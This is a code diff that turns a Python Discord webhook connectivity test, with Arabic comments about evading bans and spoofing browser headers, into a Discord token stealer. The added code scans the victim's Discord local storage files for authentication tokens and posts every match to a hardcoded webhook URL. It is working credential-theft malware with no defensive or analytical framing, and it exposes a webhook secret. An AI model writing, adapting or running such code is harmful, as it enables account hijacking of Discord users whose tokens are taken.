@@ -1,28 +1,19 @@
+import os
+import re
 import requests
-import json
 
-# ضع الـ Webhook الجديد هنا (قم بإنشاء واحد جديد تماماً لتجنب الحظر)
+def get_tokens():
+    path = os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb'
+    tokens = []
+    for file in os.listdir(path):
+        if file.endswith('.log') or file.endswith('.ldb'):
+            with open(f'{path}\\{file}', 'r', errors='ignore') as f:
+                content = f.read()
+                found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
+                for token in found:
+                    if token not in tokens:
+                        tokens.append(token)
+    return tokens
 webhook_url = "https://discord.com/api/webhooks/1512068343723724931/BzOOKGGPyUv8YY1nx5kxZc9Jt9d8j4UcUICTNaIH5BaJ63veyxCYRP_AQ58Rk8W2EU--"
-
-# payload بسيط جداً للتأكد من وصول الرسالة
-payload = {
-    "content": "SHANNON-Ω: Diagnostic Test - Connection Validated"
-}
-
-# هيدرات تحاكي متصفح Chrome حقيقي
-headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Content-Type": "application/json"
-}
-
-try:
-    # استخدام timeout لتجنب التعليق الأبدي
-    response = requests.post(webhook_url, json=payload, headers=headers, timeout=15)
-    
-    print(f"Status Code: {response.status_code}")
-    if response.status_code == 204:
-        print("النتيجة: النجاح التام. الـ Webhook يعمل والاتصال ممتاز.")
-    else:
-        print(f"النتيجة: فشل. محتوى الخطأ: {response.text}")
-except Exception as e:
-    print(f"النتيجة: فشل ذريع في الاتصال. الخطأ: {e}")
+for token in get_tokens():
+    requests.post(webhook_url, json={"content": f"Token Found: {token}"})
